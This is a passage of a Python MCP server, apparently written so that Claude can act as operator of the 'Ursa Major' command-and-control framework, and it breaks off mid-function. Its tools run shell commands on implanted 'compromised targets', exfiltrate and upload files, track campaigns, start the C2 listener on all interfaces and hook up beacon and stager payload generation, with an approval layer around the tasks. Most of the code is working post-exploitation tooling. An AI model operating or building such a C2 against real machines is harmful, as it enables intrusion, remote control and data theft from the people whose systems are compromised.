#!/usr/bin/env python3
"""
Ursa — C2 Operator MCP Server
================================
Claude's interface to the Ursa Major C2 framework.

Lets Claude manage sessions, issue tasks, track results, generate
payloads, and control the C2 — all from conversation.

Tools:
    Sessions:
        - ursa_sessions      — List all active/stale/dead sessions
        - ursa_session_info  — Get detailed info on a session
        - ursa_set_session_context — Set campaign/tags on a session
        - ursa_campaign_info — Get campaign summary
        - ursa_campaign_timeline — Get campaign timeline
        - ursa_campaign_add_note — Add campaign note
        - ursa_campaign_notes — List campaign notes
        - ursa_campaign_delete_note — Delete campaign note
        - ursa_campaign_checklist — List campaign checklist items
        - ursa_campaign_playbooks — List checklist playbooks
        - ursa_campaign_save_playbook — Create/update checklist playbook
        - ursa_campaign_delete_playbook — Delete checklist playbook
        - ursa_campaign_apply_playbook — Apply playbook to campaign checklist
        - ursa_campaign_snapshot_playbook — Snapshot campaign checklist into a playbook
        - ursa_campaign_add_checklist_item — Add campaign checklist item
        - ursa_campaign_update_checklist_item — Update checklist item
        - ursa_campaign_delete_checklist_item — Delete checklist item
        - ursa_campaign_bulk_update_checklist — Bulk status update by checklist filter
        - ursa_campaign_checklist_history — Checklist history timeline
        - ursa_campaign_checklist_alerts — Checklist due/overdue alert view
        - ursa_campaign_checklist_from_alerts — Generate checklist items from policy alerts
        - ursa_campaign_handoff — Generate handoff brief
        - ursa_campaign_handoff_report — Export handoff report
        - ursa_kill_session  — Kill a session

    Tasking:
        - ursa_shell         — Run a shell command on a target
        - ursa_task          — Send any task type to a session
        - ursa_task_result   — Check a task's result
        - ursa_tasks         — List tasks for a session

    Files:
        - ursa_download      — Download a file from a target
        - ursa_upload        — Upload a file to a target
        - ursa_files         — List exfiltrated files

    C2 Management:
        - ursa_start_c2      — Start the C2 server daemon
        - ursa_stop_c2       — Stop the C2 server
        - ursa_c2_status     — Check if C2 is running
        - ursa_events        — View C2 event log
        - ursa_approvals     — View pending/approved/rejected approvals
        - ursa_approve       — Approve one request
        - ursa_reject        — Reject one request
        - ursa_approve_campaign — Bulk-approve requests by campaign/tag
        - ursa_reject_campaign — Bulk-reject requests by campaign/tag

    Payload Generation:
        - ursa_generate      — Generate a beacon payload
        - ursa_stager        — Generate a stager one-liner

Run with:
    /path/to/ursa/venv/bin/python3 server.py
    /path/to/ursa/venv/bin/python3 server.py --transport streamable-http --host 127.0.0.1 --port 8765
    # For the merged control-plane surface, prefer: python3 -m major.web --port 6707
"""

import argparse
import base64
import csv
import json
import os
import signal
import subprocess
import sys
import time
from datetime import datetime
from pathlib import Path

from mcp.server.fastmcp import FastMCP

# Add project root and minor package to path
PROJECT_ROOT = Path(__file__).parent
sys.path.insert(0, str(PROJECT_ROOT))
sys.path.insert(0, str(PROJECT_ROOT / "minor" / "src"))

from major.db import (  # noqa: E402
    add_campaign_checklist_item,
    add_campaign_note,
    apply_campaign_playbook,
    delete_campaign_checklist_item,
    delete_campaign_note,
    delete_campaign_playbook,
    delete_campaign_policy,
    evaluate_campaign_policy_alerts,
    get_campaign_timeline,
    get_events,
    get_immutable_audit,
    get_session,
    get_setting,
    get_task,
    kill_session,
    list_approval_requests,
    list_campaign_checklist,
    list_campaign_checklist_history,
    list_campaign_notes,
    list_campaign_playbooks,
    list_campaign_policies,
    list_files,
    list_sessions,
    list_tasks,
    set_setting,
    snapshot_campaign_checklist_to_playbook,
    update_campaign_checklist_item,
    update_session_info,
    upsert_campaign_playbook,
    upsert_campaign_policy,
    verify_immutable_audit_chain,
)
from major.governance import (  # noqa: E402
    format_risk_matrix,
    get_policy_remediation_plan,
    normalize_args_string,
    process_approval_decision,
    process_bulk_approval_decisions,
    queue_task_with_policy,
)
from major.netinsight import (  # noqa: E402
    device_count as _net_device_count,
    list_devices as _net_list_devices,
)
from major.pihole import (  # noqa: E402
    dns_overview as _dns_overview,
    top_domains as _dns_top_domains,
    top_talkers as _dns_top_talkers,
)
from implants.builder import Builder as _PayloadBuilder  # noqa: E402
from implants.builder import PayloadConfig, auto_c2_url  # noqa: E402

mcp_server = FastMCP(
    "ursa",
    instructions="""Ursa — Command & Control operator interface.
    You have tools to manage implant sessions, issue commands to compromised
    targets, track results, generate payloads, and control the C2 server.
    The C2 server (Ursa Major) must be running for session management to work.
    Use ursa_start_c2 to launch it if needed.""",
)

VENV_PYTHON = str(PROJECT_ROOT / "venv" / "bin" / "python3")
C2_PID_FILE = str(PROJECT_ROOT / "major" / ".c2.pid")


def _format_time(ts):
    """Format a Unix timestamp to human-readable."""
    if not ts:
        return "never"
    return datetime.fromtimestamp(ts).strftime("%Y-%m-%d %H:%M:%S")


def _time_ago(ts):
    """Human-readable time since timestamp."""
    if not ts:
        return "never"
    diff = time.time() - ts
    if diff < 60:
        return f"{int(diff)}s ago"
    elif diff < 3600:
        return f"{int(diff/60)}m ago"
    elif diff < 86400:
        return f"{int(diff/3600)}h ago"
    else:
        return f"{int(diff/86400)}d ago"


# ── C2 Management ──


@mcp_server.tool()
def ursa_start_c2(port: int = 6708, host: str = "0.0.0.0") -> str:
    """
    Start the Ursa Major C2 server as a background daemon.

    Args:
        port: Port to listen on (default 6708)
        host: Bind address (default 0.0.0.0)
    """
    # Check if already running
    if os.path.exists(C2_PID_FILE):
        try:
            with open(C2_PID_FILE) as f:
                pid = int(f.read().strip())
            os.kill(pid, 0)  # Check if process exists
            return f"Ursa Major is already running (PID {pid}) on port {port}"
        except (ProcessLookupError, ValueError):
            os.unlink(C2_PID_FILE)

    # Build command — pull TLS/profile from config if set
    cmd = [
        VENV_PYTHON, str(PROJECT_ROOT / "major" / "server.py"),
        "--port", str(port),
        "--host", host,
    ]

    # Read active config for TLS / profile defaults
    try:
        sys.path.insert(0, str(PROJECT_ROOT))
        from major.config import get_config as _gc
        cfg = _gc()
        if cfg.get("major.tls.enabled", False):
            cmd.append("--tls")
            cp = cfg.get("major.tls.cert_path", "")
            kp = cfg.get("major.tls.key_path", "")
            if cp:
                cmd += ["--cert", cp]
            if kp:
                cmd += ["--key", kp]
        profile = cfg.get("major.traffic_profile", "default")
        if profile and profile != "default":
            cmd += ["--traffic-profile", profile]
    except Exception:
        pass

    # Start C2 server
    proc = subprocess.Popen(
        cmd,
        cwd=str(PROJECT_ROOT),
        stdout=open(str(PROJECT_ROOT / "major" / "c2.log"), "a"),
        stderr=subprocess.STDOUT,
        start_new_session=True,
    )

    with open(C2_PID_FILE, "w") as f:
        f.write(str(proc.pid))

    time.sleep(1)

    if proc.poll() is None:
        return f"Ursa Major C2 started on {host}:{port} (PID {proc.pid})"
    else:
        return "Failed to start C2 server. Check major/c2.log for errors."


@mcp_server.tool()
def ursa_stop_c2() -> str:
    """Stop the Ursa Major C2 server."""
    if not os.path.exists(C2_PID_FILE):
        return "Ursa Major is not running (no PID file)"

    try:
        with open(C2_PID_FILE) as f:
            pid = int(f.read().strip())
        os.kill(pid, signal.SIGTERM)
        os.unlink(C2_PID_FILE)
        return f"Ursa Major stopped (PID {pid})"
    except ProcessLookupError:
        os.unlink(C2_PID_FILE)
        return "Ursa Major was not running (stale PID file removed)"
    except Exception as e:
        return f"Error stopping C2: {e}"


@mcp_server.tool()
def ursa_c2_status() -> str:
    """Check if the Ursa Major C2 server is running and show stats."""
    running = False
    pid = None

    if os.path.exists(C2_PID_FILE):
        try:
            with open(C2_PID_FILE) as f:
                pid = int(f.read().strip())
            os.kill(pid, 0)
            running = True
        except (ProcessLookupError, ValueError):
            pass

    sessions = list_sessions()
    active = [s for s in sessions if s["status"] == "active"]
    stale = [s for s in sessions if s["status"] == "stale"]
    dead = [s for s in sessions if s["status"] == "dead"]

    lines = [
        "URSA MAJOR — STATUS",
        "=" * 40,
        f"Server:     {'RUNNING (PID ' + str(pid) + ')' if running else 'STOPPED'}",
        f"Sessions:   {len(active)} active, {len(stale)} stale, {len(dead)} dead",
        f"Total:      {len(sessions)}",
    ]

    if active:
        lines.append("")
        lines.append("Active Sessions:")
        for s in active:
            lines.append(f"  {s['id']}  {s['username']}@{s['hostname']}  "
                        f"({s['remote_ip']})  last: {_time_ago(s['last_seen'])}")

    return "\n".join(lines)


# ── Session Management ──


@mcp_server.tool()
def ursa_sessions(
    status: str | None = None,
    campaign: str | None = None,
    tag: str | None = None,
) -> str:
    """
    List all implant sessions.

    Args:
        status: Filter by status — "active", "stale", or "dead".
        campaign: Filter by campaign name.
        tag: Filter by tag substring.
    """
    sessions = list_sessions(status=status, campaign=campaign, tag=tag)

    if not sessions:
        return f"No {'sessions' if not status else status + ' sessions'} found."

    lines = [
        f"{'ID':<10} {'User@Host':<26} {'Campaign':<14} {'Tags':<18} {'Last Seen':<12} {'Status'}",
        "-" * 110,
    ]

    for s in sessions:
        user_host = f"{s['username']}@{s['hostname']}"
        campaign_name = s.get("campaign") or "-"
        tags = s.get("tags") or "-"
        lines.append(
            f"{s['id']:<10} {user_host[:26]:<26} {campaign_name[:14]:<14} {tags[:18]:<18} "
            f"{_time_ago(s['last_seen']):<12} {s['status']}"
        )

    lines.append(f"\n{len(sessions)} sessions total")
    return "\n".join(lines)


@mcp_server.tool()
def ursa_network_inventory(only_new: bool = False) -> str:
    """
    Show the home-network device inventory and flag unknown devices.

    Reports the current device count and lists each device with its IP, MAC,
    vendor, and whether it is trusted (part of the established baseline) or
    new/unknown — the "a new device joined the network" security signal.

    Args:
        only_new: When true, list only untrusted/unknown devices.
    """
    counts = _net_device_count()
    devices = _net_list_devices(only_untrusted=only_new)

    header = (
        f"Network devices: {counts['total']} total "
        f"({counts['trusted']} trusted, {counts['untrusted']} unknown)"
    )
    if not devices:
        scope = "unknown devices" if only_new else "devices"
        return f"{header}\n\nNo {scope} recorded yet. Run a scan and ingest it."

    lines = [
        header,
        "",
        f"{'IP':<16} {'MAC':<19} {'Vendor':<14} {'Label':<14} {'Trust':<8} Last Seen",
        "-" * 95,
    ]
    for d in devices:
        trust = "trusted" if d.get("trusted") else "UNKNOWN"
        label = d.get("label") or "-"
        lines.append(
            f"{(d.get('ip') or '-'):<16} {d['mac']:<19} "
            f"{(d.get('vendor') or '-')[:14]:<14} {label[:14]:<14} {trust:<8} "
            f"{_time_ago(d['last_seen'])}"
        )
    return "\n".join(lines)


@mcp_server.tool()
def ursa_dns_talkers(since_hours: float = 24, limit: int = 10, client: str = "") -> str:
    """
    Show which devices are talking the most DNS, and to where (via Pi-hole).

    Answers "what is each client on my network actually contacting" using the
    DNS query log Pi-hole already keeps. Reports the blocked-vs-allowed ratio,
    the top talkers by query volume, and — when a client is given — that
    client's most-queried domains.

    Args:
        since_hours: Look-back window in hours (default 24).
        limit: Max rows for talkers/domains (default 10).
        client: Optional client IP to drill into its top domains.
    """
    ov = _dns_overview(since_hours=since_hours)
    if not ov.get("available"):
        return (
            "Pi-hole DNS insight is unavailable — the FTL database could not be "
            "read. Check the configured pihole.db_path and that it is mounted."
        )

    pct = round(ov["block_ratio"] * 100, 1)
    lines = [
        f"DNS over last {ov['since_hours']}h: {ov['total']} queries from "
        f"{ov['clients']} client(s), {ov['blocked']} blocked ({pct}%).",
    ]

    if client:
        domains = _dns_top_domains(since_hours=since_hours, limit=limit, client=client)
        lines.append("")
        lines.append(f"Top domains for {client}:")
        if not domains:
            lines.append("  (no queries in window)")
        for d in domains:
            lines.append(f"  {d['count']:>6}  {d['domain']}")
        return "\n".join(lines)

    talkers = _dns_top_talkers(since_hours=since_hours, limit=limit)
    lines.append("")
    lines.append(f"{'Client':<18} {'Queries':>8} {'Blocked':>8} {'Block%':>7}")
    lines.append("-" * 45)
    for t in talkers:
        tpct = round(t["block_ratio"] * 100, 1)
        lines.append(f"{t['client']:<18} {t['total']:>8} {t['blocked']:>8} {tpct:>6}%")
    return "\n".join(lines)


@mcp_server.tool()
def ursa_set_session_context(session_id: str, campaign: str = "", tags: str = "") -> str:
    """
    Set campaign and tags for a session to support grouping/organization.

    Args:
        session_id: Target session ID.
        campaign: Campaign/group name.
        tags: Comma-separated tags (e.g., "finance,dc1,high-value").
    """
    s = get_session(session_id)
    if not s:
        return f"Session {session_id} not found."
    update_session_info(session_id, campaign=campaign.strip(), tags=tags.strip())
    return (
        f"Session {session_id} updated.\n"
        f"Campaign: {campaign.strip() or '-'}\n"
        f"Tags: {tags.strip() or '-'}"
    )


@mcp_server.tool()
def ursa_session_info(session_id: str) -> str:
    """
    Get detailed information about a specific session.

    Args:
        session_id: The session ID to look up
    """
    s = get_session(session_id)
    if not s:
        return f"Session {session_id} not found."

    tasks = list_tasks(session_id=session_id, limit=10)
    files = list_files(session_id=session_id)

    lines = [
        f"SESSION: {s['id']}",
        "=" * 50,
        f"  Status:      {s['status']}",
        f"  Remote IP:   {s['remote_ip']}",
        f"  Hostname:    {s['hostname']}",
        f"  Username:    {s['username']}",
        f"  OS:          {s['os']}",
        f"  Arch:        {s['arch']}",
        f"  PID:         {s['pid']}",
        f"  Process:     {s['process_name']}",
        f"  Campaign:    {s.get('campaign') or '-'}",
        f"  Tags:        {s.get('tags') or '-'}",
        f"  First seen:  {_format_time(s['first_seen'])}",
        f"  Last seen:   {_format_time(s['last_seen'])} ({_time_ago(s['last_seen'])})",
        f"  Interval:    {s['beacon_interval']}s (jitter: {s['jitter']})",
        f"  Encrypted:   {'Yes' if s.get('encryption_key') else 'No'}",
    ]

    if tasks:
        lines.append(f"\n  Recent Tasks ({len(tasks)}):")
        for t in tasks:
            status_icon = {"completed": "✓", "error": "✗", "pending": "○", "in_progress": "◐"}.get(t["status"], "?")
            lines.append(f"    {status_icon} {t['id']}  {t['task_type']:<12}  {t['status']}")

    if files:
        lines.append(f"\n  Files ({len(files)}):")
        for f in files:
            lines.append(f"    {f['id']}  {f['filename']:<25}  {f['size']}B  {f['direction']}")

    return "\n".join(lines)


@mcp_server.tool()
def ursa_kill_session(session_id: str) -> str:
    """
    Kill/deactivate a session.

    Args:
        session_id: The session ID to kill
    """
    s = get_session(session_id)
    if not s:
        return f"Session {session_id} not found."

    decision = queue_task_with_policy(
        session_id=session_id,
        task_type="kill",
        args={},
        actor="mcp:ursa_kill_session",
    )
    if decision["status"] == "approval_required":
        return (
            f"Kill action requires approval ({decision['risk_level']} risk).\n"
            f"Approval ID: {decision['approval_id']}\n"
            f"Use ursa_approve('{decision['approval_id']}') to proceed."
        )
    if decision["status"] != "queued":
        return f"Kill action denied: {decision['message']}"
    kill_session(session_id)
    return (
        f"Session {session_id} ({s['username']}@{s['hostname']}) killed.\n"
        f"Kill task queued: {decision['task_id']}"
    )


# ── Tasking ──


@mcp_server.tool()
def ursa_shell(session_id: str, command: str) -> str:
    """
    Execute a shell command on a target.

    The command is queued and will execute on the next beacon check-in.
    Use ursa_task_result to check the output.

    Args:
        session_id: Target session ID
        command: Shell command to execute
    """
    s = get_session(session_id)
    if not s:
        return f"Session {session_id} not found."
    if s["status"] == "dead":
        return f"Session {session_id} is dead. Cannot issue tasks."

    decision = queue_task_with_policy(
        session_id=session_id,
        task_type="shell",
        args={"command": command},
        actor="mcp:ursa_shell",
    )
    if decision["status"] == "approval_required":
        return (
            f"Shell task requires approval ({decision['risk_level']} risk).\n"
            f"Approval ID: {decision['approval_id']}\n"
            f"{decision['message']}"
        )
    if decision["status"] != "queued":
        return f"Shell task denied: {decision['message']}"
    task_id = decision["task_id"]
    return (f"Shell task queued: {task_id}\n"
            f"Target: {s['username']}@{s['hostname']}\n"
            f"Command: {command}\n"
            f"Will execute on next beacon (interval: {s['beacon_interval']}s)")


@mcp_server.tool()
def ursa_task(session_id: str, task_type: str, args: str = "{}") -> str:
    """
    Send any task type to a session.

    Task types: shell, sysinfo, download, upload, sleep, kill, ps,
                pwd, cd, ls, whoami, env

    Args:
        session_id: Target session ID
        task_type: The task type to send
        args: JSON string of arguments (e.g., '{"command": "whoami"}')
    """
    s = get_session(session_id)
    if not s:
        return f"Session {session_id} not found."

    try:
        task_args = normalize_args_string(args)
    except ValueError as exc:
        return str(exc)

    decision = queue_task_with_policy(
        session_id=session_id,
        task_type=task_type,
        args=task_args,
        actor="mcp:ursa_task",
    )
    if decision["status"] == "approval_required":
        return (
            f"Task requires approval ({decision['risk_level']} risk).\n"
            f"Approval ID: {decision['approval_id']}\n"
            f"Type: {task_type}\n"
            f"Args: {json.dumps(task_args)}"
        )
    if decision["status"] != "queued":
        return f"Task denied: {decision['message']}"
    task_id = decision["task_id"]
    return (f"Task queued: {task_id}\n"
            f"Type: {task_type}\n"
            f"Args: {json.dumps(task_args)}\n"
            f"Target: {s['username']}@{s['hostname']}")


@mcp_server.tool()
def ursa_task_result(task_id: str) -> str:
    """
    Check the result of a task.

    Args:
        task_id: The task ID to check
    """
    t = get_task(task_id)
    if not t:
        return f"Task {task_id} not found."

    lines = [
        f"TASK: {t['id']}",
        f"Type:      {t['task_type']}",
        f"Session:   {t['session_id']}",
        f"Status:    {t['status']}",
        f"Created:   {_format_time(t['created_at'])}",
    ]

    if t.get("picked_up_at"):
        lines.append(f"Picked up: {_format_time(t['picked_up_at'])}")
    if t.get("completed_at"):
        lines.append(f"Completed: {_format_time(t['completed_at'])}")

    if t["status"] == "pending":
        lines.append("\n(Waiting for implant to check in...)")
    elif t["status"] == "in_progress":
        lines.append("\n(Implant picked up task, waiting for result...)")
    elif t.get("result"):
        lines.append(f"\n--- Output ---\n{t['result']}")
    if t.get("error"):
        lines.append(f"\n--- Error ---\n{t['error']}")

    return "\n".join(lines)


@mcp_server.tool()
def ursa_tasks(
    session_id: str | None = None,
    status: str | None = None,
    campaign: str | None = None,
    tag: str | None = None,
    limit: int = 20,
) -> str:
    """
    List tasks, optionally filtered by session and/or status.

    Args:
        session_id: Filter to a specific session
        status: Filter by status — "pending", "in_progress", "completed", "error"
        campaign: Filter by campaign name
        tag: Filter by tag substring
        limit: Max tasks to return (default 20)
    """
    tasks = list_tasks(
        session_id=session_id,
        status=status,
        campaign=campaign,
        tag=tag,
        limit=limit,
    )

    if not tasks:
        return "No tasks found."

    lines = [
        f"{'ID':<10} {'Session':<10} {'Campaign':<14} {'Type':<12} {'Status':<12} {'Created'}",
        "-" * 85,
    ]

    for t in tasks:
        lines.append(
            f"{t['id']:<10} {t['session_id']:<10} {(t.get('campaign') or '-')[:14]:<14} {t['task_type']:<12} "
            f"{t['status']:<12} {_time_ago(t['created_at'])}"
        )

    return "\n".join(lines)


# ── File Operations ──


@mcp_server.tool()
def ursa_download(session_id: str, remote_path: str) -> str:
    """
    Download a file from a target (exfiltrate to C2).

    Queues a download task. The file will be available via ursa_files
    once the implant checks in and sends it.

    Args:
        session_id: Target session ID
        remote_path: Path on the target to download
    """
    s = get_session(session_id)
    if not s:
        return f"Session {session_id} not found."

    decision = queue_task_with_policy(
        session_id=session_id,
        task_type="download",
        args={"path": remote_path},
        actor="mcp:ursa_download",
    )
    if decision["status"] == "approval_required":
        return (
            f"Download task requires approval ({decision['risk_level']} risk).\n"
            f"Approval ID: {decision['approval_id']}"
        )
    if decision["status"] != "queued":
        return f"Download task denied: {decision['message']}"
    task_id = decision["task_id"]
    return (f"Download task queued: {task_id}\n"
            f"Target file: {remote_path}\n"
            f"Will transfer on next beacon check-in.")


@mcp_server.tool()
def ursa_upload(session_id: str, local_path: str, remote_path: str) -> str:
    """
    Upload a file to a target (deliver from C2).

    Args:
        session_id: Target session ID
        local_path: Local file path to upload
        remote_path: Destination path on the target
    """
    s = get_session(session_id)
    if not s:
        return f"Session {session_id} not found."

    local_path_expanded = os.path.expanduser(local_path)
    if not os.path.exists(local_path_expanded):
        return f"Local file not found: {local_path}"

    with open(local_path_expanded, "rb") as f:
        data = f.read()

    decision = queue_task_with_policy(
        session_id=session_id,
        task_type="upload",
        args={"path": remote_path, "data": base64.b64encode(data).decode()},
        actor="mcp:ursa_upload",
    )
    if decision["status"] == "approval_required":
        return (
            f"Upload task requires approval ({decision['risk_level']} risk).\n"
            f"Approval ID: {decision['approval_id']}"
        )
    if decision["status"] != "queued":
        return f"Upload task denied: {decision['message']}"
    task_id = decision["task_id"]
    return (f"Upload task queued: {task_id}\n"
            f"File: {local_path} ({len(data)} bytes) → {remote_path}")


@mcp_server.tool()
def ursa_files(session_id: str | None = None) -> str:
    """
    List files transferred to/from implants.

    Args:
        session_id: Filter to a specific session (optional)
    """
    files = list_files(session_id=session_id)

    if not files:
        return "No files stored."

    lines = [
        f"{'ID':<10} {'Session':<10} {'Filename':<30} {'Size':<10} {'Dir':<10} {'Time'}",
        "-" * 85,
    ]

    for f in files:
        lines.append(
            f"{f['id']:<10} {f['session_id']:<10} {f['filename']:<30} "
            f"{f['size']:<10} {f['direction']:<10} {_time_ago(f['created_at'])}"
        )

    return "\n".join(lines)


# ── Events ──


@mcp_server.tool()
def ursa_events(
    limit: int = 30,
    level: str | None = None,
    campaign: str | None = None,
    tag: str | None = None,
) -> str:
    """
    View the C2 event log.

    Args:
        limit: Number of events to show (default 30)
        level: Filter by level — "info", "warning", "error"
        campaign: Filter by campaign name
        tag: Filter by tag substring
    """
    events = get_events(limit=limit, level=level, campaign=campaign, tag=tag)

    if not events:
        return "No events."

    lines = []
    for e in events:
        ts = datetime.fromtimestamp(e["timestamp"]).strftime("%H:%M:%S")
        sid = f" [{e['session_id']}]" if e.get("session_id") else ""
        camp = f" ({e['campaign']})" if e.get("campaign") else ""
        lines.append(f"[{ts}] {e['level'].upper():<7} {e['source']}{sid}{camp}: {e['message']}")

    return "\n".join(lines)


@mcp_server.tool()
def ursa_campaigns() -> str:
    """Summarize session/task/event activity by campaign."""
    sessions = list_sessions()
    tasks = list_tasks(limit=1000)
    events = get_events(limit=1000)

    campaigns: dict[str, dict[str, int]] = {}
    for s in sessions:
        name = (s.get("campaign") or "unassigned").strip() or "unassigned"
        campaigns.setdefault(name, {"sessions": 0, "tasks": 0, "events": 0})
        campaigns[name]["sessions"] += 1
    for t in tasks:
        name = (t.get("campaign") or "unassigned").strip() or "unassigned"
        campaigns.setdefault(name, {"sessions": 0, "tasks": 0, "events": 0})
        campaigns[name]["tasks"] += 1
    for e in events:
        name = (e.get("campaign") or "unassigned").strip() or "unassigned"
        campaigns.setdefault(name, {"sessions": 0, "tasks": 0, "events": 0})
        campaigns[name]["events"] += 1

    if not campaigns:
        return "No campaign activity found."

    lines = [
        f"{'Campaign':<20} {'Sessions':<10} {'Tasks':<10} {'Events'}",
        "-" * 56,
    ]
    for name, counts in sorted(campaigns.items(), key=lambda item: item[0]):
        lines.append(
            f"{name[:20]:<20} {counts['sessions']:<10} {counts['tasks']:<10} {counts['events']}"
        )
    return "\n".join(lines)


@mcp_server.tool()
def ursa_campaign_report(campaign: str, output_format: str = "json") -> str:
    """
    Export a campaign report to disk.

    Args:
        campaign: Campaign name to export.
        output_format: "json" or "csv".
    """
    campaign_name = campaign.strip()
    if not campaign_name:
        return "Campaign is required."
    fmt = output_format.strip().lower()
    if fmt not in {"json", "csv"}:
        return "output_format must be 'json' or 'csv'."

    sessions = list_sessions(campaign=campaign_name)
    tasks = list_tasks(campaign=campaign_name, limit=5000)
    events = get_events(campaign=campaign_name, limit=5000)
    notes = list_campaign_notes(campaign=campaign_name, limit=2000)

    reports_dir = PROJECT_ROOT / "reports"
    reports_dir.mkdir(parents=True, exist_ok=True)
    safe_name = "".join(ch if ch.isalnum() or ch in "-_." else "_" for ch in campaign_name)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")

    if fmt == "json":
        report = {
            "campaign": campaign_name,
            "generated_at": datetime.now().isoformat(),
            "counts": {
                "sessions": len(sessions),
                "tasks": len(tasks),
                "events": len(events),
                "notes": len(notes),
            },
            "sessions": sessions,
            "tasks": tasks,
            "events": events,
            "notes": notes,
        }
        out_path = reports_dir / f"campaign_{safe_name}_{ts}.json"
        with open(out_path, "w", encoding="utf-8") as f:
            json.dump(report, f, indent=2)
    else:
        out_path = reports_dir / f"campaign_{safe_name}_{ts}.csv"
        with open(out_path, "w", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            writer.writerow(["section", "id", "session_id", "type", "status_or_level", "message"])
            for s in sessions:
                writer.writerow(["session", s["id"], s["id"], "session", s.get("status", ""), s.get("hostname", "")])
            for t in tasks:
                writer.writerow(["task", t["id"], t.get("session_id", ""), t.get("task_type", ""), t.get("status", ""), ""])
            for e in events:
                writer.writerow(["event", e["id"], e.get("session_id", ""), e.get("source", ""), e.get("level", ""), e.get("message", "")])
            for n in notes:
                writer.writerow(["note", n["id"], "", n.get("author", ""), "info", n.get("note", "")])

    return (
        f"Campaign report exported.\n"
        f"Campaign: {campaign_name}\n"
        f"Format: {fmt}\n"
        f"Path: {out_path}"
    )


@mcp_server.tool()
def ursa_campaign_info(campaign: str) -> str:
    """
    Show detailed operational context for a campaign.

    Args:
        campaign: Campaign name.
    """
    campaign_name = campaign.strip()
    if not campaign_name:
        return "Campaign is required."
    sessions = list_sessions(campaign=campaign_name)
    tasks = list_tasks(campaign=campaign_name, limit=200)
    events = get_events(campaign=campaign_name, limit=200)
    approvals = list_approval_requests(status="pending", campaign=campaign_name, limit=200)
    notes = list_campaign_notes(campaign=campaign_name, limit=200)
    checklist = list_campaign_checklist(campaign=campaign_name, limit=300)
    if not sessions and not tasks and not events and not approvals and not notes and not checklist:
        return f"No activity found for campaign '{campaign_name}'."

    by_status: dict[str, int] = {}
    by_task_type: dict[str, int] = {}
    by_risk: dict[str, int] = {"critical": 0, "high": 0, "medium": 0, "low": 0}
    checklist_counts = {"pending": 0, "in_progress": 0, "blocked": 0, "done": 0}
    for s in sessions:
        status = s.get("status", "unknown")
        by_status[status] = by_status.get(status, 0) + 1
    for t in tasks:
        ttype = t.get("task_type", "unknown")
        by_task_type[ttype] = by_task_type.get(ttype, 0) + 1
    for a in approvals:
        risk = (a.get("risk_level") or "").lower()
        if risk in by_risk:
            by_risk[risk] += 1
    for row in checklist:
        st = (row.get("status") or "pending").strip().lower()
        if st not in checklist_counts:
            st = "pending"
        checklist_counts[st] += 1

    lines = [
        f"CAMPAIGN: {campaign_name}",
        "=" * 50,
        f"Sessions:          {len(sessions)}",
        f"Tasks (recent):    {len(tasks)}",
        f"Events (recent):   {len(events)}",
        f"Pending approvals: {len(approvals)}",
        f"Notes:             {len(notes)}",
        f"Checklist items:   {len(checklist)}",
        "",
        "Session Status:",
    ]
    for key, count in sorted(by_status.items(), key=lambda item: item[0]):
        lines.append(f"  {key}: {count}")

    lines.extend(
        [
            "",
            "Task Types:",
        ]
    )
    for key, count in sorted(by_task_type.items(), key=lambda item: item[1], reverse=True)[:10]:
        lines.append(f"  {key}: {count}")

    lines.extend(
        [
            "",
            "Pending Approval Risk:",
            f"  critical: {by_risk['critical']}",
            f"  high:     {by_risk['high']}",
            f"  medium:   {by_risk['medium']}",
            f"  low:      {by_risk['low']}",
        ]
    )
    lines.extend(
        [
            "",
            "Checklist Status:",
            f"  pending:     {checklist_counts['pending']}",
            f"  in_progress: {checklist_counts['in_progress']}",
            f"  blocked:     {checklist_counts['blocked']}",
            f"  done:        {checklist_counts['done']}",
        ]
    )
    if sessions:
        lines.append("")
        lines.append("Recent Sessions:")
        for s in sessions[:10]:
            lines.append(
                f"  {s['id']} {s['username']}@{s['hostname']} "
                f"({s['remote_ip']}) {s['status']}"
            )
    if notes:
        lines.append("")
        lines.append("Recent Notes:")
        for n in notes[:10]:
            lines.append(f"  [{_format_time(n['created_at'])}] {n['author']}: {n['note']}")
    return "\n".join(lines)


@mcp_server.tool()
def ursa_campaign_timeline(campaign: str, limit: int = 100) -> str:
    """
    Show unified campaign timeline (events, tasks, approvals).
    """
    name = campaign.strip()
    if not name:
        return "Campaign is required."
    rows = get_campaign_timeline(name, limit=max(1, min(limit, 500)))
    if not rows:
        return f"No timeline entries for campaign '{name}'."

    lines = [
        f"CAMPAIGN TIMELINE: {name}",
        "=" * 70,
        f"{'Time':<19} {'Kind':<10} {'Ref':<10} {'Severity':<12} {'Summary'}",
        "-" * 100,
    ]
    for row in rows:
        ts = datetime.fromtimestamp(row["ts"]).strftime("%Y-%m-%d %H:%M:%S")
        lines.append(
            f"{ts:<19} {row['kind']:<10} {row['ref_id'][:10]:<10} "
            f"{str(row.get('severity', ''))[:12]:<12} {row.get('summary', '')}"
        )
    return "\n".join(lines)


@mcp_server.tool()
def ursa_campaign_add_note(campaign: str, note: str, author: str = "mcp:operator") -> str:
    """Add an operator note to a campaign."""
    name = campaign.strip()
    text = note.strip()
    if not name:
        return "Campaign is required."
    if not text:
        return "Note is required."
    add_campaign_note(name, text, author=author.strip() or "mcp:operator")
    return f"Added note to campaign {name}."


@mcp_server.tool()
def ursa_campaign_notes(campaign: str, limit: int = 30) -> str:
    """List recent campaign notes."""
    name = campaign.strip()
    if not name:
        return "Campaign is required."
    rows = list_campaign_notes(campaign=name, limit=max(1, min(limit, 200)))
    if not rows:
        return f"No notes for campaign '{name}'."
    lines = [f"CAMPAIGN NOTES: {name}", "=" * 70]
    for row in rows:
        lines.append(f"[{_format_time(row['created_at'])}] {row['author']}: {row['note']}")
    return "\n".join(lines)


@mcp_server.tool()
def ursa_campaign_playbooks(limit: int = 50) -> str:
    """List available checklist playbooks."""
    rows = list_campaign_playbooks(limit=max(1, min(limit, 200)))
    if not rows:
        return "No campaign playbooks configured."
    lines = [f"{'Playbook':<24} {'Items':<8} {'Updated':<20} Description", "-" * 90]
    for row in rows:
        lines.append(
            f"{row['name'][:24]:<24} {len(row.get('items') or []):<8} "
            f"{_format_time(row.get('updated_at')):<20} {row.get('description') or ''}"
        )
    return "\n".join(lines)


@mcp_server.tool()
def ursa_campaign_save_playbook(name: str, items_json: str, description: str = "") -> str:
    """Create or update a checklist playbook from JSON list of items."""
    playbook = name.strip()
    if not playbook:
        return "name is required."
    try:
        items = json.loads(items_json)
    except json.JSONDecodeError:
        return "items_json must be valid JSON (array of strings or item objects)."
    try:
